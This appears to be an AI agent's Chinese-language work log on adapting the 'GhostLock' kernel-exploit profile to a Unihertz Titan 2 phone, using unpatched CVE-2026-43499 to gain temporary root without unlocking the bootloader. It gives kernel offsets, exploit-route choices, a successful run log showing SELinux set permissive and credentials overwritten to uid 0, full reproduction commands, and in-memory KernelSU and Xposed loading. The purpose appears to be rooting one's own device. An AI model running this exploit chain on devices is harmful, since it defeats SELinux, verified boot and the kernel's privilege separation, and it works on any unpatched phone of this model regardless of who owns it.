# Titan 2 的 GhostLock profile 移植记录

> 目标：给 **Unihertz Titan 2**（MediaTek MT6878 / Dimensity 7300，国际版 TEE 固件）
> 写一份可用的 GhostLock **kernel profile**，用来拿临时 root，再挂 KernelSU / ZygiskNext / LSPosed。
> 目标 profile 落在 `vendor/ghostlock-app/app/src/main/assets/kernel_profiles/`。

## 1. 结论摘要

| 项 | 值 | 证据 |
| --- | --- | --- |
| SoC | MediaTek **MT6878**（Dimensity 7300），工程号 `g71v78c2k` | 固件内 `MT6878_Android_scatter.xml`、DT `model = MT6878` |
| 内核家族 | **6.1**（android14 GKI），`STRUCT_OFFSETS_6_1` | extractor 判定：`kernel_family STRUCT_OFFSETS_6_1 (verified Android family)` |
| 目标 release | `6.1.145-android14-11-gbd17012cc2f7-ab14044926` | 固件 1.00.10（国际版 2025111915）内核 banner；Android 16 固件同内核 |
| 备选 release | `6.1.115-android14-11-g6b18f0b574ab-ab12901745` | 固件 1.00 / 1.00.07（2025090819、2025102716） |
| **CVE-2026-43499** | **未修补**（`remove_waiter` 仍走原逻辑） | extractor：`primitive remove_waiter@0x100a5fc unpatched`（6.1.115 为 `0xffc6bc`） |
| `kernel_phys_load` | `0x40000000` | `vendor_boot.img` 头 `kernel_addr` |
| `kernel_phys_offset`（DRAM 基址） | `0x40000000` | `vendor_boot.img` 内 DT：`/memory@40000000 reg = <0x0 0x40000000 0x0 0x40000000>` |
| route | `tcp_zerocopy`（`compact_waiter = 1`），回落 `select_stack`（`waiter_shift = 1`） | 见 §4 |

> 设备端还没接上，`uname -r` 的**最终**值要用 `adb shell uname -r` 确认；两个候选都做了 profile。

## 2. 固件从哪来（不需要设备、不需要解锁）

Unihertz 官方把固件放在 Google Drive，社区做了镜像（Seafile）：

```
https://cloud.lichtmetzger.de/d/ccc9017f47a6459d8b37/
  /Firmware/Android 15/TEE/2025111915_g71v78c2k_dfl_tee.zip   # 国际版 1.00.10
  /Firmware/Android 15/TEE/2025102716_g71v78c2k_dfl_tee.zip   # 国际版 1.00.07
  /Firmware/Android 15/TEE/2025090819_g71v78c2k_dfl_tee.zip   # 国际版 1.00
  /Firmware/Android 16/TEE/2026021022_...zip, 2026042212_...zip
```

固件包 **3.5GB**，但解 profile 只需要 `boot.img` + `vendor_boot.img`。
`scripts/remote-zip-extract.py` 用 HTTP Range 只取中央目录 + 需要的成员（几十 MB）：

```bash
./scripts/fetch-firmware.sh --list          # 列出镜像上的固件
./scripts/fetch-firmware.sh 2025111915      # 取 boot.img / vendor_boot.img 到 artifacts/
```

`TEE` = 国际版/全球版，`EEA` = 欧洲版；本项目目标机是**国际版（TEE）**。

## 3. 提取

```bash
(cd vendor/ghostlock-app/tools/extract_rs && cargo build --release)   # 需要 nightly（rust-version ≥ 1.97.1）
EX=vendor/ghostlock-app/build/extract/release/ghostlock-extract

$EX artifacts/fw-TEE-2025111915/boot.img \
   --vendor-boot artifacts/fw-TEE-2025111915/vendor_boot.img \
   --format conf --out profile.conf
```

关键输出：

```
info: vendor_boot; kernel_phys_load=0x40000000 (MiB-aligned but not provably the DRAM base; ...)
info: kallsyms layout pre-6.4 recovered (101934 symbols)
info: (CVE-2026-43499 primitive present (remove_waiter@0x100a5fc still uses current)
info: pselect chain __arm64_sys_pselect6->core_sys_select ... waiter=0x98 shift=1 (derived 3 - 2)
info: sizeof(mm_struct)=0x3C0 (MM_STRUCT_SZ=0x500 in src/core/common.h)
```

镜像格式（自己确认过，方便以后换机器）：

- `boot.img` = AOSP boot **v4** 头（`header_size=0x630`、`header_version=4`），
  内核载荷在 `align(0x630, 4096) = 0x1000`，**MTK LZ4 legacy 帧**（magic `0x184C2102`），
  解出来是 arm64 Image（`text_offset = 0`）。
- `vendor_boot.img` = `VNDRBOOT` 头 `header_version=4`，`kernel_addr = 0x40000000`；
  **DT 也在这个文件里**（偏移 `0x19ac040`），`/memory@40000000` 给出 DRAM 基址与大小。

## 4. 三个需要判断的点

### 4.1 `kernel_phys_offset`（DRAM 基址）不能只靠对齐推

extractor 的 `vendor_boot::classify` 只在 `kernel_addr & 0xFFFFF == 0x80000`（arm64 512KB 文本对齐）
时**证明** DRAM 基址；本机是 MiB 对齐（`0x40000000`），它会拒绝猜测、留 `null`。
这是对的：MiB 对齐既可能是「基址本身」，也可能是「基址上若干 MiB」。

本机的定论来自 **DT**：`vendor_boot.img` 里的 `/memory@40000000 reg = <0x0 0x40000000 0x0 0x40000000>`
→ DRAM 基址 `0x40000000`、大小 1GiB。与上游另一台 MTK 6.1 设备（Motorola Edge 60 Fusion，
`6.1.145-android14-11-g9b69cc399ae1-ab14819715`）的 `kernel_phys_load = kernel_phys_offset = 0x40000000` 一致。

真机阶段还会用 `/proc/iomem`（`tools/mtk-phys`）复核一次。

### 4.2 route：`tcp_zerocopy` 主路 + `select_stack` 回落

extractor 建议 `select_stack`（高置信度，因为它从本内核推导出 pselect/futex 栈几何：`shift=1`），
但上游 **23 个 6.1 内置 profile 全部用 `tcp_zerocopy { compact_waiter = 1 }`**，其中包含一台 MTK 设备，
且 native 的回落方向**只有** `tcp_zerocopy → select_stack`（`threads.cpp`：
"TCP route cleanly failed; used Select Stack fallback"）。

所以最终取「两边都要」：

```hocon
route   { tcp_zerocopy { compact_waiter = 1 } }
fallback { to = "select_stack", route { select_stack { waiter_shift = 1 } } }
```

`waiter_shift = 1` 是本内核 pselect 链推出来的（原始 `shift=3` 会把 waiter 顶到 fd_set 最后一个可用字，
`wake_state` 会落到拷贝范围外，extractor 因此减 2）。

### 4.3 `mm_struct_sz = 1024` 不是 BTF 的 `sizeof`

extractor 从 BTF 量到 `sizeof(mm_struct) = 0x3C0`，但 profile 里写 `1024`：
report.rs 注释说明「0x400 是设备的 SLUB stride，不是 BTF sizeof」；上游 6.1 profile 也都是 1024。保持一致。

## 5. 产出

新增 profile（已登记进 `index.conf`）：

- `6.1.145-android14-11-gbd17012cc2f7-ab14044926.conf`
- `6.1.115-android14-11-g6b18f0b574ab-ab12901745.conf`

结构体布局（`task_struct`）与上游已验证的 6.1 profile **逐字段一致**
（`cred=2104`、`pi_lock=2340`、`pi_waiters=2360`、`pi_blocked_on=2384`、`seccomp=2304`、`sched_task_group=840` …），
符号偏移（`init_task` / `init_cred` / `selinux_enforcing` …）来自本镜像内嵌 kallsyms。

## 6. 真机验证记录（2026-10-21 ✅ 已通过）

设备（通过宿主的 adb 操作，宿主 = 用户的 Windows 机器）：

| 项 | 值 |
| --- | --- |
| 序列号 | `TTANCN2100002663` |
| 机型 / 固件 | Unihertz **Titan 2** / `Titan 2_V01.00.14`（Android **16**，BP2A.250605.031.A3） |
| SoC | `mt6878` / `MT6878`（Dimensity 7300） |
| `uname -r` | **`6.1.145-android14-11-gbd17012cc2f7-ab14044926`** ← 与 profile 的 `release` 逐字符一致 |
| bootloader | `ro.boot.flash.locked=1`、`verifiedbootstate=green`（**锁定，全程没解锁**） |
| SELinux | `Enforcing`（利用前） |
| 已有 root | 无（`/data/adb` 不可读、无 `su`；只有 Shizuku） |

跑的东西：

- native payload：上游 pre-release 的 `ghostlock`（241,400 B，sha256 `6890fd2a…`）
  —— 与**我们本地构建并 strip 的产物 sha256 完全一致**（可复现）。
- profile：我们导出的 GLK1 `.bin`（1,955 B，sha256 `3b7a1916…`）。

命令（CLI 路线，shell 用户身份，无需 root）：

```bash
adb shell /data/local/tmp/ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin
```

结果（**第一次运行即成功**）：

```
[+] resolved profile loaded: 6.1.145-android14-11-gbd17012cc2f7-ab14044926
[+] p0 profile phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0
    slide_logger=ffffff8001ff29c8 init_task=ffffff8001fff600
[*] tcp route enter page=ffffff80347f0000 ... attempts=2000 arm=16 hold=20000
[*] tcp route done=1 calls=1 success=1 status=0 clean=1/1 step=0 errno=0
[+] SELinux permissive            ← W1 写成功
[+] child is root!                ← W2 写 cred 成功，child uid = 0
[+] no app seccomp filter (adb/shell flow); skipping W3
[-] temporary root ready; KernelSU module load pending
```

要点：

- route `tcp_zerocopy` 一次命中（`clean=1/1`），没有回落到 `select_stack`；
- `init_cred` 的 direct-map 地址 = `ffffff8002011a68`
  = `0x2011a68`（镜像内偏移）`| 0xffffff8000000000`（MTK linear map）——与 native 的公式一致；
- 利用自身抓到的 `/proc/iomem`：`40000000-4807ffff : System RAM`、
  `40010000-41bbffff : Kernel code` → **DRAM 基址 0x40000000**，
  独立验证了 profile 里 `kernel_phys_load = kernel_phys_offset = 0x40000000`；
- SELinux policy 修复成功（`policy fixup rc=0`，随后恢复 enforcing）；
- 临时 root 由 `root_child` 前端持有（native 进程存活期间有效），
  并把 `/proc/iomem` 缓存到 `/data/local/tmp/.ghostlock_iomem`；
- 缺 `ksud`（设备上没装 KernelSU 系管理器）→ `KernelSU module load pending`，
  这是「临时 root → LSPosed」链路剩下的部分。

## 7. 复现步骤

```bash
# 1) 设备事实（只读）
adb shell uname -r                 # 6.1.145-android14-11-gbd17012cc2f7-ab14044926
adb shell getprop ro.boot.flash.locked   # 1（锁定，不解锁）
./scripts/titan2-props.sh | tee artifacts/props-$(date +%F).txt

# 2) 把 native payload 与 profile 推上去
adb push vendor/ghostlock-app/build/native/ghostlock /data/local/tmp/ghostlock
adb push vendor/ghostlock-app/build/kernel-profiles/6.1.145-android14-11-gbd17012cc2f7-ab14044926.bin \
        /data/local/tmp/profile.bin
adb shell chmod 755 /data/local/tmp/ghostlock

# 3) 跑（CLI 路线，shell 用户身份）
adb shell /data/local/tmp/ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin
```

注意事项：

- 跑之前设备上**不能**有 KernelSU 补丁或已加载的 KernelSU 模块
  （BakaSU / ReSukiSU / KowSU 同理）——会被利用当成干扰项。
- 走 adb shell 时进程**没有 seccomp 过滤** → native 会跳过 W3 阶段（日志里会写明）。
- native 进程存活期间临时 root 才有效（`root_child` 前端持有 root 凭据）；
  想长期持有就让 KernelSU late-load 成功（见下）。

## 8. 临时 root → LSPosed

### 8.1 KernelSU late-load（已完成 ✅）

不改 boot、不改内核镜像，**在内存里**加载 KernelSU：

1. 装官方 **KernelSU v3.3.1** 管理器 APK（`me.weishu.kernelsu`）——
   它的 `libksud.so` 内嵌了各 KMI 的 `kernelsu.ko`（release 里有
   `lkm-aarch64-android14-6.1_kernelsu.ko`，正好对上本机 KMI `android14-6.1`）。
2. 重跑利用 → root 脚本自动执行：

   ```sh
   ksud late-load --kmi android14-6.1 --allow-shell
   ```

   结果：

   ```
   [*] late-load kmi=android14-6.1
   [*] late-load exit=0
   [+] KernelSU module loaded
   kernelsu 225280 1 - Live 0x0000000000000000 (O)
   uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
   ```

3. 效果：shell 用户直接 `su` 就是 root（`allow_shell=1`），
   `/data/adb/ksu/bin/{ksud,bootctl,busybox,resetprop}` 就位，
   SELinux 已恢复 enforcing。

> 注意：late-load 的 KernelSU 只在内存里，**重启即失效**（本项目的非目标就是永久 root）。

### 8.2 Zygisk + Xposed 框架（已完成 ✅）

链路：`ZygiskNext`（Zygisk 的独立实现，提供 Zygisk API）+
`Vector v2.2`（LSPosed 的继任者，Android 15/16 用的就是它），
都以 KernelSU 模块的形式装进 `/data/adb/modules`：

```sh
# ZygiskNext
adb push ZygiskNext.zip /data/local/tmp/zygisknext.zip
su -c '/data/adb/ksu/bin/ksud module install /data/local/tmp/zygisknext.zip'

# Vector（LSPosed 继任者）
adb push Vector.zip /data/local/tmp/vector.zip
su -c '/data/adb/ksu/bin/ksud module install /data/local/tmp/vector.zip'
adb install -r manager.apk          # org.matrix.vector.manager
```

踩过的坑（照抄即可）：

1. `ksud module install` 只把模块放进 `/data/adb/modules_update/`，
   **要再跑一次 `ksud late-load`（或 `ksud post-fs-data`）** 才会搬进 `/data/adb/modules/` 并跑 stage 脚本。
2. **zygiskd 必须在模块装好之后重启**，否则它扫不到新模块：
   `znctl stop` → 重跑 `ksud post-fs-data` → `znctl dump-zn` 才看得到 `modules64:1,zygisk_vector`。
3. **zygote 要重起一次**才能吃到注入（`ksud soft-reboot`，或杀 zygote 让 init 重拉）。
4. Vector 的 daemon 别用 `unshare --propagation`（设备上的 toybox `unshare` 没这个参数），
   直接 `cd /data/adb/modules/zygisk_vector && ./daemon &`。

验证结果：

```
$ su -c '/data/adb/ksu/bin/znctl status'
version_local:1.5.2-864-a4a72ce-release
uname:6.1.145-android14-11-gbd17012cc2f7-ab14044926 aarch64
inject_state:1
root_status:✅KernelSU (32680)
modules64:1,zygisk_vector

$ su -c '/data/adb/modules/zygisk_vector/cli status'
Framework Version: 2.2
Version Code: 3080
API Version: 102
Enabled Modules: 0
Status Notification: true
```

即：**Xposed 框架已经活着**（`Enabled Modules: 0` 只是还没装模块）。
模块管理有 CLI：`cli modules ls|enable|disable`、`cli scope add|ls|rm|set`。

### 8.3 还差最后一步：装一个具体模块

框架已经能管模块，剩下只是把**模块 APK** 装进去（Vector 的 manager 界面里选 APK 安装，
或者把模块 APK 装上后由 manager 检测，再用 CLI `enable` + `scope add`）。
本项目真正的用途是给 `hwkbd_ime` / `term-ime` / `titan_ir_remote` / `titan_dial` 做 hook，
那部分属于后续工作（模块要自己写）。

> 设备当前是**有密码的锁屏**状态（`wm dismiss-keyguard` 无效），要动 manager 界面需要用户先解锁。

## 9. 本机构建环境（真机阶段要用的）

| 东西 | 位置 / 做法 |
| --- | --- |
| extractor（host） | `cargo +nightly-2026-08-20 build --release`（stable 1.95.0 达不到 `rust-version ≥ 1.97.1`）；产物在 `vendor/ghostlock-app/build/extract/release/ghostlock-extract` |
| native payload | `ANDROID_NDK_HOME=/home/gem/android-sdk/ondk-r30.1 make -C vendor/ghostlock-app/src ghostlock` → `build/native/ghostlock`（已编译通过，零告警） |
| app APK | `ONDK_HOME=/home/gem/android-sdk/ondk-r30.1 ANDROID_NDK_HOME=$ONDK_HOME ./gradlew :app:assembleDebug`（本地 NDK 26/27 都编不了 native，见 brain 页 `local-toolchain-gotchas`）；产物 `build/app/outputs/apk/debug/GhostLock-v1.2(581)-arm64-v8a-debug.apk`（21MB，内含 `libghostlock.so`、`libextract.so` 与本项目两份 profile） |
| GLK1 profile | `./gradlew :profile-core:exportKernelProfiles` → `build/kernel-profiles/<release>.bin`（72 份，含本项目两份） |
| CLI 路线 | `./scripts/run-exploit.sh <uname-r>`（推 native + profile.bin 到 `/data/local/tmp` 再跑，日志回收到 `artifacts/logs/`） |

`vendor/ghostlock-app` 的改动落在本地分支 `feat/titan2-profile`（`0b9438f`，基于 pin 的 `d2ab286e`），
父仓库的 submodule pin 仍指向 `d2ab286e` —— 要不要提 PR 上游 / 更新 pin 由你决定。
